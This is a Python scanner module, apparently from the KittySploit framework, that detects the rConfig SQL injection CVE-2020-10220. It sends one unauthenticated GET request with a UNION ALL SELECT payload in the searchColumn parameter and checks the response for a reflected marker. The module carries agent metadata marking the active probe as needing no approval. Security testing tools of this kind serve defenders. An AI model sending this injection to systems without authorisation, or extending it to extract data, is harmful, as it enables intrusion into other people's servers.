#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""rConfig commands.inc.php SQL injection (CVE-2020-10220)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'rConfig - commands.inc.php SQLi Detection (CVE-2020-10220)',
        'description': (
            'Detects CVE-2020-10220 by injecting UNION SELECT of a marker into '
            'commands.inc.php searchColumn and looking for id="<marker>" in the response.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': [
            'web', 'scanner', 'cve', 'cve2020', 'rconfig', 'sqli', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 0.9,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'risk_signal', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [
                    'scanner/http/cve_2020_10547_detect',
                    'scanner/http/cve_2020_10548_detect',
                ],
            },
        },
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2020-10220'],
        'cve': 'CVE-2020-10220',
    }

    base_path = OptString('', 'Optional rConfig base path', required=False)

    def _prefix(self) -> str:
        base = str(self.base_path or '').strip()
        if not base or base == '/':
            return ''
        if not base.startswith('/'):
            base = '/' + base
        return base.rstrip('/')

    def run(self):
        marker = 'ksploit20'
        hx = marker.encode().hex().upper()
        path = (
            f'{self._prefix()}/commands.inc.php?searchOption=contains&searchField=vuln'
            f'&search=search&searchColumn=command%20UNION%20ALL%20SELECT%200x{hx},NULL--'
        )
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r:
            return False
        if f'id="{marker}"' in (r.text or ''):
            self.set_info(
                severity='high',
                reason='rConfig commands.inc.php SQLi (CVE-2020-10220)',
                path=f'{self._prefix()}/commands.inc.php',
            )
            return True
        return False
